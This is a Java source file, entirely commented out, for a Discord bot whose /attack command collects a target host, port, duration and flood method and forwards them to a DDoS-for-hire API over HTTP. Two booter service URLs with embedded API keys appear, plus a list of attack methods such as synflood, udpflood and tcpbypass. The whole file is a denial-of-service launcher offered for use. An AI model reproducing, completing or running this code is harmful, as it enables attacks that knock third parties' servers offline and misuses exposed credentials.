//package me.c1tad31.bogobot.doscommands;
//
//import net.dv8tion.jda.api.events.interaction.ModalInteractionEvent;
//import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
//import net.dv8tion.jda.api.hooks.ListenerAdapter;
//import net.dv8tion.jda.api.interactions.components.ActionRow;
//import net.dv8tion.jda.api.interactions.components.Modal;
//import net.dv8tion.jda.api.interactions.components.text.TextInput;
//import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
//import org.jetbrains.annotations.NotNull;
//
//import javax.annotation.Nonnull;
//import java.io.File;
//import java.io.IOException;
//import java.net.HttpURLConnection;
//import java.net.URL;
//
//public class AttackCommand extends ListenerAdapter {
//    @Override
//    public void onSlashCommandInteraction(@NotNull SlashCommandInteractionEvent event) {
//        if (event.getName().equals("attack")) {
//            TextInput host = TextInput.create("host", "Host", TextInputStyle.SHORT)
//                    .setPlaceholder("1.1.1.1")
//                    .setMinLength(1)
//                    .setMaxLength(100)
//                    .build();
//            TextInput port = TextInput.create("port", "Port", TextInputStyle.SHORT)
//                    .setPlaceholder("80")
//                    .setMinLength(1)
//                    .setMaxLength(100)
//                    .build();
//            TextInput time = TextInput.create("time", "Time", TextInputStyle.SHORT)
//                    .setPlaceholder("100")
//                    .setMinLength(1)
//                    .setMaxLength(100)
//                    .build();
//            TextInput method = TextInput.create("method", "Method", TextInputStyle.SHORT)
//                    .setPlaceholder("UDP")
//                    .setMinLength(1)
//                    .setMaxLength(100)
//                    .build();
//
//            Modal modal = Modal.create("attack", "Attack Menu")
//                    .addActionRows(ActionRow.of(host), ActionRow.of(port), ActionRow.of(time), ActionRow.of(method))
//                    .build();
//
//            event.replyModal(modal).queue();
//        }
//    }
//
//    public void onModalInteraction(@Nonnull ModalInteractionEvent event) {
//        if (event.getModalId().equals("attack")) {
//            String host = event.getValue("host").getAsString();
//            String port = event.getValue("port").getAsString();
//            String time = event.getValue("time").getAsString();
//            String method = event.getValue("method").getAsString();
//
//            try {
//                sendAttack(host, port, time, method);
//            } catch (IOException e) {
//                e.printStackTrace();
//            }
//
//            event.reply(String.format("Attack Sent Successfully to: %s on Port: %s for %s's with Method: %s", host, port, time, method)).setEphemeral(true).queue();
//        }
//    }
//
//    public void sendAttack(String host, String port, String time, String method) throws IOException {
//        // Other API: https://gucciapi.com/api/attack.php?key=qJiL7ZNfYydQ&host=[HOST]&port=[PORT]&duration=[TIME]&method=![METHOD]
//        URL url  = new URL(String.format("https://hitora.solutions/api/api.php?key=jHbXsgnc75mLZ4TE&vip=0&host=%s&port=%s&time=%s&method=%s", host, port, time, method));
//        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
//        connection.setRequestMethod("GET");
//        connection.setConnectTimeout(5000);
//        connection.connect();
//    }
//    // Main Methods
////    HOME,TCP-ACID,OVH-BLITZ,UDP-GAME
//    // Other methods
////    udpflood,stdhex,vseflood,synflood,ackflood,tcpbypass,udppps,stdpps,https,tcpkill,sshcrash
//}
